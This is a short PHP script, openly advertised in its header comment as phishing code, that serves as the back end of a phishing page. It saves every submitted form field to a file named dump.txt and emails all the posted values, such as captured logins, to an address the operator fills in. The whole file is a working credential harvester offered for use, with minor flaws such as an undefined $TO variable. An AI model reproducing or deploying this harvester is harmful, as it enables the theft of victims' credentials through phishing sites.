<?php

/*                                                                                                         
####################################################################
# s'abonner sur ma chaine youtube pour avoir plus de code phishing #
# et hacking,il me donne le courage de faire les codes phishing    #                                                                              
#                                                                  #
# subscribe on my youtube channel to have more phishing code       #
# and hacking, it gives me the courage to do the phishing codes    #
#                                                                  #
#             ||~~ BY ~~ hakanonymos ~~||                          #
#                                                                  #
#                                                                  #
#                                                                  #
#    skype et email : hakanonymos@hotmail.com                      #                                                                 
####################################################################                                                                                                    
*/

$fichier = fopen('dump.txt', 'r+' );
 file_put_contents('dump.txt' , print_r($_POST, true));
 fclose($fichier);


$headers = 'MIME-Version: 1.0' . "\r\n"; 
 
$headers .= 'To: YOUR EMAIL HERE' . "\r\n";//ici vous mettez votre email 

$headers .= 'From: YOUR WEBSITE HERE' . "\r\n";// vous metez une boite email OU le nom de ton site

$headers .= 'Content-Type: text/plain; charset=UTF-8' . "\r\n";
$headers .= 'Content-Transfer-Encoding: 8bit' . "\r\n";
$subject = "resultats";
$message = "";
while (list($key, $val) = each($_POST)) {if(!empty($val)) {$message .= "$key : $val\n";}}
mail($TO, $subject, $message, $headers);
 
 
 
 ?>
